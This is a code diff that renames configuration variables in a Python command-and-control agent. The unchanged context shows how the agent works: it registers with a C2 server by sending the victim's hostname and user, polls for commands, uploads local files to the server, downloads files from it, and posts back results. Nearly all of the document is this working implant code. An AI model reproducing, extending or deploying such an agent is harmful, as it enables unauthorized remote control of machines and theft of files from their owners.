@@ -6,8 +6,8 @@ import os
 from pathlib import Path
 
 # Configuration constants
-serverip = None
-agent_id = None
+SERVER_IP = None
+AGENT_ID = None
 REQUEST_TIMEOUT = 30  # seconds for most requests
 UPLOAD_TIMEOUT = 120  # seconds for file uploads
 DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
@@ -15,7 +15,7 @@ SLEEP_TIME = 3
 
 # function to send to server a join request to c2
 def connect():
-    r = rq.post(f"http://{serverip}/join", params={
+    r = rq.post(f"http://{SERVER_IP}/join", params={
         'hostname': get_hostname(),
         'user': get_whoami()
     }, timeout=REQUEST_TIMEOUT).json()
@@ -26,7 +26,7 @@ def connect():
 
 
 def check_commands():
-    r = rq.get(f"http://{serverip}/agent/get_commands/{agent_id}", timeout=REQUEST_TIMEOUT)
+    r = rq.get(f"http://{SERVER_IP}/agent/get_commands/{AGENT_ID}", timeout=REQUEST_TIMEOUT)
     commands = r.json()['commands']
     if commands:
         print("[+] got new commands !!")
@@ -57,8 +57,8 @@ def execute_upload_command(command_data):
         # Read and upload file
         with open(source_path, 'rb') as f:
             files = {'file': (filename, f)}
-            params = {'agent_id': agent_id}
-            r = rq.post(f"http://{serverip}/agent/upload_file", params=params, files=files, timeout=UPLOAD_TIMEOUT)
+            params = {'agent_id': AGENT_ID}
+            r = rq.post(f"http://{SERVER_IP}/agent/upload_file", params=params, files=files, timeout=UPLOAD_TIMEOUT)
 
         if r.status_code == 200:
             result = r.json()
@@ -83,7 +83,7 @@ def execute_download_command(command_data):
             return {'status': 'error', 'error': 'Missing url or save_as'}
 
         # Download file with timeout
-        r = rq.get(f"http://{serverip}{url}", stream=True, timeout=DOWNLOAD_TIMEOUT)
+        r = rq.get(f"http://{SERVER_IP}{url}", stream=True, timeout=DOWNLOAD_TIMEOUT)
 
         # Check file size from Content-Length header before downloading
         if 'content-length' in r.headers:
@@ -143,13 +143,13 @@ def execute_command_by_type(command):
 def send_result(command_id, result):
     """Send result for a single command"""
     params = {
-        'agent_id': agent_id,
+        'agent_id': AGENT_ID,
         'command_id': command_id,
         'status': result['status'],
         'result': result.get('result'),
         'error': result.get('error')
     }
-    r = rq.post(f"http://{serverip}/agent/set_command_result", params=params, timeout=REQUEST_TIMEOUT)
+    r = rq.post(f"http://{SERVER_IP}/agent/set_command_result", params=params, timeout=REQUEST_TIMEOUT)
     print(f"[+] Result sent: {r.json()}")
 
 
@@ -157,12 +157,12 @@ def main():
     if len(argv) != 2:
         print("Usage: python main.py <ip>:<port>")
         return
-    global agent_id
-    global serverip
-    serverip = argv[1]
-    agent_id = connect()
+    global AGENT_ID
+    global SERVER_IP
+    SERVER_IP = argv[1]
+    AGENT_ID = connect()
 
-    if not agent_id:
+    if not AGENT_ID:
         print("[-] Failed to connect to server")
         return
 
